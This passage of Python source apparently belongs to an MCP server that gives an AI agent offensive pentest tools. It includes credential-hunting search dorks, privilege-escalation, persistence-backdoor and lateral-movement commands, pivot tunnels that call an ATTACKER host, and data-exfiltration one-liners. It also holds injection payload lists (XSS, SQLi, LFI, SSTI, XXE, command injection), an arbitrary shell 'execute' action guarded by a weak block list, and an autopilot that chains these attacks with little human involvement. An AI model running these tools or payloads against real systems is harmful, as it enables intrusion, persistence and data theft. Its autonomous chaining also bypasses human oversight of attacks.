                for field in ["Registrar:", "Creation Date:", "Updated Date:", "Name Server:", "Organization:", "Registrant:"]:
                    match = re.search(f"{field}\\s*(.+)", wr["stdout"], re.IGNORECASE)
                    if match:
                        whois_data[field.rstrip(":").strip()] = match.group(1).strip()
            results["modules"]["whois"] = whois_data
        if "dorking" in mod_list:
            dr = {"dorks": [
                f'site:{hostname} filetype:pdf', f'site:{hostname} filetype:xlsx',
                f'site:{hostname} inurl:admin', f'site:{hostname} inurl:login',
                f'site:{hostname} intitle:"index of"', f'site:{hostname} inurl:api',
                f'"{hostname}" password OR secret OR credentials filetype:txt',
                f'site:{hostname} ext:sql OR ext:bak OR ext:log',
            ]}
            results["modules"]["dorking"] = dr
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 16: POST-EXPLOIT OPS
# ============================================================================

@mcp.tool()
async def post_exploit_ops(
    target: str, depth: str = "deep", modules: str = "all",
    session_type: str = "auto", timeout: int = 600,
) -> str:
    """Post-exploitation: pivoting, persistence, lateral movement, privilege escalation, data exfil.
    modules: all|privesc,persist,lateral,pivot,exfil"""
    target = InputValidator.sanitize_target(target)
    execution = session_manager.start_execution("post_exploit_ops", target, {"depth": depth})
    results = {"target": target, "modules": {}}
    try:
        mod_list = modules.split(",") if modules != "all" else ["privesc", "persist", "lateral", "pivot", "exfil"]
        if "privesc" in mod_list:
            pr = {"linux": {}, "windows": {}}
            pr["linux"] = {
                "enumeration": ["linpeas.sh", "linux-exploit-suggester.sh", "pspy64"],
                "checks": [
                    "sudo -l (sudo misconfig)", "find / -perm -4000 (SUID)",
                    "cat /etc/crontab (cron jobs)", "ls -la /etc/passwd (writable?)",
                    "getcap -r / 2>/dev/null (capabilities)", "env (environment vars)",
                    "ss -tlnp (internal services)", "cat /etc/shadow (readable?)",
                ],
                "kernel": "uname -a | linux-exploit-suggester",
            }
            pr["windows"] = {
                "enumeration": ["winpeas.exe", "PowerUp.ps1", "Seatbelt.exe", "SharpUp.exe"],
                "checks": [
                    "whoami /priv (token privs)", "net localgroup administrators",
                    "systeminfo (missing patches)", "reg query (autologon creds)",
                    "schtasks /query (scheduled tasks)", "wmic service list (unquoted paths)",
                    "icacls C:\\Program Files (writable dirs)", "cmdkey /list (saved creds)",
                ],
            }
            results["modules"]["privesc"] = pr
        if "persist" in mod_list:
            per = {
                "linux": ["crontab -e", "~/.bashrc injection", "systemd service", "SSH key", "LD_PRELOAD", "PAM backdoor"],
                "windows": ["schtasks", "Registry Run key", "WMI event", "DLL hijack", "Golden Ticket", "Startup folder"],
            }
            results["modules"]["persist"] = per
        if "lateral" in mod_list:
            lat = {
                "techniques": [
                    "PsExec (impacket-psexec)", "WMIExec (impacket-wmiexec)",
                    "SMBExec (impacket-smbexec)", "Evil-WinRM", "RDP",
                    "Pass-the-Hash (pth-winexe)", "Pass-the-Ticket",
                    "SSH key reuse", "Crackmapexec SMB",
                ],
                "tools": {
                    "crackmapexec": f"crackmapexec smb {target} -u user -p pass --shares",
                    "psexec": f"impacket-psexec DOMAIN/user:pass@{target}",
                    "wmiexec": f"impacket-wmiexec DOMAIN/user:pass@{target}",
                    "evil_winrm": f"evil-winrm -i {target} -u user -p pass",
                },
            }
            results["modules"]["lateral"] = lat
        if "pivot" in mod_list:
            piv = {
                "tools": {
                    "ligolo-ng": {"setup": f"ligolo-agent -connect ATTACKER:11601 -retry", "proxy": "ligolo-proxy -selfcert -laddr 0.0.0.0:11601"},
                    "chisel": {"server": "chisel server -p 8080 --reverse", "client": f"chisel client ATTACKER:8080 R:socks"},
                    "ssh_tunnel": {"dynamic": f"ssh -D 9050 user@{target}", "local": f"ssh -L 8080:internal:80 user@{target}", "remote": f"ssh -R 8080:localhost:80 user@{target}"},
                    "socat": f"socat TCP-LISTEN:8080,fork TCP:{target}:80",
                },
                "proxychains": "Configure /etc/proxychains.conf then: proxychains nmap -sT target",
            }
            results["modules"]["pivot"] = piv
        if "exfil" in mod_list:
            exf = {
                "methods": [
                    "HTTP: python3 -m http.server + wget", "DNS: dnscat2 / iodine",
                    "ICMP: icmpsh", "SMB: smbclient put", "SCP: scp file user@host:/path",
                    "base64: cat file | base64 | curl -d @-", "steganography: steghide embed",
                ],
            }
            results["modules"]["exfil"] = exf
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 17: REPORTING ENGINE
# ============================================================================

@mcp.tool()
async def reporting_engine(
    target: str, report_type: str = "full", format: str = "json", timeout: int = 300,
) -> str:
    """Report generation: scope check, security audit, header analysis, full pentest report.
    report_type: full|executive|technical|scope_check|header_audit"""
    target = InputValidator.sanitize_target(target)
    execution = session_manager.start_execution("reporting_engine", target, {"report_type": report_type})
    results = {"target": target, "report_type": report_type}
    try:
        context = pentest_memory.get_context(target)
        all_findings = pentest_memory.get_findings(target)
        if report_type == "scope_check":
            results["scope"] = {
                "target": target,
                "resolvable": False,
                "ip_addresses": [],
            }
            try:
                ips = socket.getaddrinfo(target.split("://")[-1].split("/")[0].split(":")[0], None)
                results["scope"]["resolvable"] = True
                results["scope"]["ip_addresses"] = list(set(a[4][0] for a in ips))
            except socket.gaierror:
                pass
        elif report_type == "header_audit":
            hr = await run_command(["curl", "-sk", "-I", target], timeout=15)
            headers = {}
            missing = []
            if hr.get("stdout"):
                for line in hr["stdout"].split("\n"):
                    if ": " in line:
                        k, v = line.split(": ", 1)
                        headers[k.strip().lower()] = v.strip()
            security_headers = {
                "strict-transport-security": "HSTS missing - vulnerable to downgrade",
                "x-content-type-options": "Missing - MIME sniffing possible",
                "x-frame-options": "Missing - clickjacking possible",
                "content-security-policy": "CSP missing - XSS risk increased",
                "x-xss-protection": "XSS protection header missing",
                "referrer-policy": "Referrer leakage possible",
                "permissions-policy": "Feature policy missing",
            }
            for hdr, risk in security_headers.items():
                if hdr not in headers:
                    missing.append({"header": hdr, "risk": risk})
            results["headers"] = headers
            results["missing_security_headers"] = missing
            results["score"] = f"{len(security_headers) - len(missing)}/{len(security_headers)}"
        elif report_type == "executive":
            # Executive-level risk summary
            correlation = vuln_correlator.correlate(target)
            kc = kill_chain.get_progress(target)
            results["executive_summary"] = {
                "risk_rating": correlation["risk_rating"],
                "attack_surface_score": correlation["attack_surface_score"],
                "total_vulnerabilities": correlation["total_vulns"],
                "severity_breakdown": correlation["by_severity"],
                "exploit_chains_count": len(correlation["exploit_chains"]),
                "top_exploit_chains": correlation["exploit_chains"][:5],
                "recommended_attack_path": correlation["recommended_attack_path"],
                "mitre_coverage": len(correlation["mitre_coverage"]),
                "kill_chain_completion": kc["completion_pct"],
                "immediate_actions": [],
            }
            # Generate prioritized remediation actions
            for chain in correlation.get("exploit_chains", [])[:3]:
                results["executive_summary"]["immediate_actions"].append({
                    "priority": "CRITICAL" if chain["severity"] == "critical" else "HIGH",
                    "action": f"Remediate: {chain['chain']}",
                    "impact": chain["yields"],
                    "mitre": chain["mitre"],
                })
            results["executive_summary"]["total_findings"] = context["total_findings"]
        else:
            # Full or technical report with intelligence
            correlation = vuln_correlator.correlate(target)
            kc = kill_chain.get_progress(target)
            results["summary"] = {
                "total_findings": context["total_findings"],
                "finding_types": context["finding_types"],
                "tech_stack": context.get("tech_stack", {}),
                "decisions": context.get("decisions", []),
            }
            # CVSS-based severity from VulnCorrelator
            results["severity_breakdown"] = correlation["by_severity"]
            results["severity_breakdown"]["total"] = correlation["total_vulns"]
            # Exploit chains and attack paths
            results["exploit_chains"] = correlation["exploit_chains"]
            results["recommended_attack_path"] = correlation["recommended_attack_path"]
            results["risk_rating"] = correlation["risk_rating"]
            results["attack_surface_score"] = correlation["attack_surface_score"]
            # MITRE ATT&CK coverage
            results["mitre_attack"] = {
                "techniques_covered": correlation["mitre_coverage"],
                "total_techniques": len(correlation["mitre_coverage"]),
            }
            # Kill chain progress
            results["kill_chain"] = kc
            # All findings
            results["findings"] = all_findings[:100]
            # Structured vulnerability list with CVSS
            vuln_list = vuln_correlator.get_vulns(target)
            results["vulnerabilities"] = [
                {"id": v.vuln_id, "title": v.title, "severity": v.severity,
                 "cvss": v.cvss_score, "port": v.port, "exploitable": v.exploitable,
                 "mitre": v.mitre_techniques, "remediation": v.remediation}
                for v in sorted(vuln_list, key=lambda x: x.cvss_score, reverse=True)
            ][:50]
            results["recommendations"] = orchestrator.recommend_next_tools(target)
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 18: AUTOPILOT COMMANDER
# ============================================================================

@mcp.tool()
async def autopilot_commander(
    target: str, depth: str = "deep", scope: str = "web",
    max_duration: int = 1800, aggressive: bool = False,
) -> str:
    """Autonomous pentest orchestrator with kill-chain tracking, parallel execution,
    cross-module correlation, dynamic CVSS scoring, and MITRE ATT&CK mapping.
    scope: web|network|cloud|internal|full|api|wireless
    Runs independent modules in PARALLEL, chains findings automatically,
    builds attack paths, and produces executive-level risk assessment."""
    target = InputValidator.sanitize_target(target)
    execution = session_manager.start_execution("autopilot_commander", target, {"scope": scope, "depth": depth})
    results = {"target": target, "scope": scope, "depth": depth, "phases": {}, "timeline": [],
               "parallel_executions": 0, "intelligence": {}}
    try:
        start_time = time.time()
        d = "aggressive" if aggressive else depth
        phase_timeout = min(300, max_duration // 4)

        def log_phase(name, data, parallel=False):
            elapsed = round(time.time() - start_time, 1)
            results["timeline"].append({"phase": name, "elapsed_s": elapsed, "parallel": parallel})
            results["phases"][name] = {"status": "completed", "summary": str(data)[:500]}

        def time_left():
            return max_duration - (time.time() - start_time)

        # ═══════════════════════════════════════════════════════════════
        # PHASE 1: RECONNAISSANCE (sequential — needed before others)
        # ═══════════════════════════════════════════════════════════════
        if time_left() > 0:
            recon = await recon_engine(target=target, depth=d, timeout=phase_timeout)
            recon_data = json.loads(recon)
            n_ports = len(recon_data.get("modules", {}).get("nmap", {}).get("open_ports", []))
            log_phase("recon", f"Ports:{n_ports}, Risk:{recon_data.get('intelligence_summary', {}).get('risk_rating', '?')}")

        # ═══════════════════════════════════════════════════════════════
        # PHASE 2: PARALLEL SURFACE SCANNING (independent scans together)
        # ═══════════════════════════════════════════════════════════════
        parallel_tasks = []
        if scope in ["web", "full", "api"] and time_left() > 0:
            parallel_tasks.append({"name": "web_assault",
                                    "coro": web_assault(target=target, depth=d, timeout=phase_timeout),
                                    "timeout": phase_timeout})
            parallel_tasks.append({"name": "api_breaker",
                                    "coro": api_breaker(target=target, depth=d, timeout=phase_timeout),
                                    "timeout": phase_timeout})
        if scope in ["network", "internal", "full"] and time_left() > 0:
            parallel_tasks.append({"name": "network_dominator",
                                    "coro": network_dominator(target=target, depth=d, timeout=phase_timeout),
                                    "timeout": phase_timeout})
        if scope in ["cloud", "full"] and time_left() > 0:
            parallel_tasks.append({"name": "cloud_siege",
                                    "coro": cloud_siege(target=target, depth=d, timeout=phase_timeout),
                                    "timeout": phase_timeout})
        if scope in ["full"] and time_left() > 0:
            parallel_tasks.append({"name": "osint_harvester",
                                    "coro": osint_harvester(target=target, depth=d, timeout=phase_timeout),
                                    "timeout": phase_timeout})

        if parallel_tasks:
            p_results = await parallel_executor.run_parallel(parallel_tasks, max_concurrent=5)
            results["parallel_executions"] += len(parallel_tasks)
            for pr in p_results:
                log_phase(pr["name"], f"status={pr['status']}, elapsed={pr.get('elapsed_s', 0)}s", parallel=True)

        # ═══════════════════════════════════════════════════════════════
        # PHASE 3: VULNERABILITY SCANNING + AUTH TESTING (parallel)
        # ═══════════════════════════════════════════════════════════════
        vuln_tasks = []
        if time_left() > 0:
            vuln_tasks.append({"name": "vuln_scanner_ultra",
                                "coro": vuln_scanner_ultra(target=target, depth=d, timeout=phase_timeout),
                                "timeout": phase_timeout})
        if scope in ["web", "full", "api"] and time_left() > 0:
            vuln_tasks.append({"name": "auth_destroyer",
                                "coro": auth_destroyer(target=target, depth=d,
                                                        modules="default_creds,cors,header_bypass,path_mutation,jwt",
                                                        timeout=phase_timeout),
                                "timeout": phase_timeout})
        if vuln_tasks:
            v_results = await parallel_executor.run_parallel(vuln_tasks, max_concurrent=3)
            results["parallel_executions"] += len(vuln_tasks)
            for vr in v_results:
                log_phase(vr["name"], f"status={vr['status']}", parallel=True)

        # ═══════════════════════════════════════════════════════════════
        # PHASE 4: TARGETED ATTACKS (based on correlation analysis)
        # ═══════════════════════════════════════════════════════════════
        correlation = vuln_correlator.correlate(target)
        context = pentest_memory.get_context(target)
        finding_types = set(context.get("finding_types", []))

        targeted_tasks = []
        # Injection testing if web vulns found
        if ("web_vulns" in finding_types or "directories" in finding_types) and time_left() > 0:
            targeted_tasks.append({"name": "injection_matrix",
                                    "coro": injection_matrix(target=target, depth=d,
                                                              modules="sqli,xss,ssti,cmdi,lfi",
                                                              timeout=min(300, int(time_left()) // 2)),
                                    "timeout": min(300, int(time_left()))})

        # Credential attacks if ports found
        if any(f in finding_types for f in ["open_ports", "smb_shares"]) and time_left() > 0:
            targeted_tasks.append({"name": "credential_cracker",
                                    "coro": credential_cracker(target=target, service="auto",
                                                                timeout=min(300, int(time_left()) // 2)),
                                    "timeout": min(300, int(time_left()))})

        # SSRF if web detected
        if ("web_vulns" in finding_types or "ssrf_potential" in finding_types) and time_left() > 0:
            targeted_tasks.append({"name": "ssrf_hunter",
                                    "coro": ssrf_hunter(target=target, param="url",
                                                         depth=d, timeout=min(200, int(time_left()) // 2)),
                                    "timeout": min(200, int(time_left()))})

        # AD attacks if SMB/LDAP/Kerberos detected
        if any(f in finding_types for f in ["smb_shares", "netbios", "ldap"]) and time_left() > 0:
            targeted_tasks.append({"name": "ad_annihilator",
                                    "coro": ad_annihilator(target=target, domain="auto",
                                                            depth=d, timeout=min(300, int(time_left()) // 2)),
                                    "timeout": min(300, int(time_left()))})

        if targeted_tasks:
            t_results = await parallel_executor.run_parallel(targeted_tasks, max_concurrent=4)
            results["parallel_executions"] += len(targeted_tasks)
            for tr in t_results:
                log_phase(tr["name"], f"status={tr['status']}", parallel=True)
                kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION, tr["name"],
                                          [f"targeted_attack:{tr['status']}"])

        # ═══════════════════════════════════════════════════════════════
        # PHASE 5: POST-EXPLOITATION (if exploitable vulns found)
        # ═══════════════════════════════════════════════════════════════
        final_correlation = vuln_correlator.correlate(target)
        if (final_correlation.get("attack_surface_score", 0) >= 50
                or final_correlation.get("exploit_chains")
                or "credentials" in finding_types) and time_left() > 0:
            post = await post_exploit_ops(target=target, depth=d,
                                           modules="privesc,persist,lateral",
                                           timeout=min(300, int(time_left())))
            log_phase("post_exploit_ops", "Post-exploitation phase executed")
            kill_chain.advance_phase(target, KillChainPhase.INSTALLATION, "post_exploit_ops",
                                      ["post_exploitation_attempted"])

        # ═══════════════════════════════════════════════════════════════
        # PHASE 6: FINAL INTELLIGENCE REPORT
        # ═══════════════════════════════════════════════════════════════
        report = await reporting_engine(target=target, report_type="full")
        report_data = json.loads(report)
        results["final_report"] = report_data

        # Full intelligence summary
        final_corr = vuln_correlator.correlate(target)
        kc_progress = kill_chain.get_progress(target)
        results["intelligence"] = {
            "risk_rating": final_corr["risk_rating"],
            "attack_surface_score": final_corr["attack_surface_score"],
            "total_vulnerabilities": final_corr["total_vulns"],
            "severity_breakdown": final_corr["by_severity"],
            "exploit_chains": final_corr["exploit_chains"],
            "recommended_attack_path": final_corr["recommended_attack_path"],
            "mitre_techniques": final_corr["mitre_coverage"],
            "kill_chain": kc_progress,
        }

        results["total_duration_s"] = round(time.time() - start_time, 1)
        results["modules_executed"] = len(results["phases"])
        results["total_findings"] = pentest_memory.get_context(target)["total_findings"]

        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 20: PAYLOAD FACTORY
# ============================================================================

@mcp.tool()
async def payload_factory(
    action: str = "list",
    target: Optional[str] = None,
    payload_type: Optional[str] = None,
    command: Optional[str] = None,
    timeout: int = 300,
) -> str:
    """Payload generation & utility tools. Actions: list, generate, execute, wpscan.
    payload_type: xss|sqli|lfi|ssti|xxe|cmdi|webshell"""
    execution = session_manager.start_execution("payload_factory", target or "local", {"action": action})
    results = {"action": action}
    try:
        if action == "list":
            results["payload_types"] = {
                "xss": ["reflected", "stored", "dom", "polyglot"],
                "sqli": ["union", "blind_boolean", "blind_time", "error_based", "stacked"],
                "lfi": ["traversal", "php_filter", "wrapper", "log_poison"],
                "ssti": ["jinja2", "twig", "freemarker", "velocity", "thymeleaf"],
                "xxe": ["file_read", "ssrf", "blind_oob", "parameter_entity"],
                "cmdi": ["semicolon", "pipe", "backtick", "dollar", "newline"],
                "webshell": ["php", "asp", "jsp", "python"],
            }
        elif action == "generate" and payload_type:
            payloads = {
                "xss": ['<script>alert(document.domain)</script>', '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>", "javascript:alert(1)", '{{constructor.constructor("return this")().alert(1)}}'],
                "sqli": ["' OR 1=1--", "' UNION SELECT NULL,NULL--", "' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"],
                "lfi": ["../../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=/etc/passwd", "/proc/self/environ", "expect://id"],
                "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "${T(java.lang.Runtime).getRuntime().exec('id')}"],
                "xxe": ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
                "cmdi": ["; id", "| id", "$(id)", "`id`", "%0a id", "|| id"],
            }
            results["payloads"] = payloads.get(payload_type, ["Unknown type"])
        elif action == "execute" and command:
            if any(d in command for d in ["rm -rf", "mkfs", "dd if", "shutdown", "> /dev"]):
                results["error"] = "Dangerous command blocked"
            else:
                r = await run_command_shell(command, timeout=InputValidator.validate_timeout(timeout))
                results["output"] = r.get("stdout", "")[:5000]
                results["stderr"] = r.get("stderr", "")[:2000]
                results["success"] = r.get("success", False)
        elif action == "wpscan" and target:
            target = InputValidator.sanitize_target(target)
            wp = await run_command(["wpscan", "--url", target, "--enumerate", "vp,vt,u", "--format", "json", "--random-user-agent"], timeout=timeout)
            if wp.get("stdout"):
                try:
                    results["wpscan"] = json.loads(wp["stdout"])
                except json.JSONDecodeError:
                    results["wpscan"] = {"raw": wp["stdout"][:3000]}
            else:
                results["wpscan"] = {"error": wp.get("stderr", "")[:1000]}
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)
    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# SERVER STARTUP
# ============================================================================

if __name__ == "__main__":
    logger.info("Starting Kali MCP Server v6 - Autonomous Pentest Engine")
    logger.info("Architecture: 20 unified mega-modules")
    mcp.run(transport="stdio")
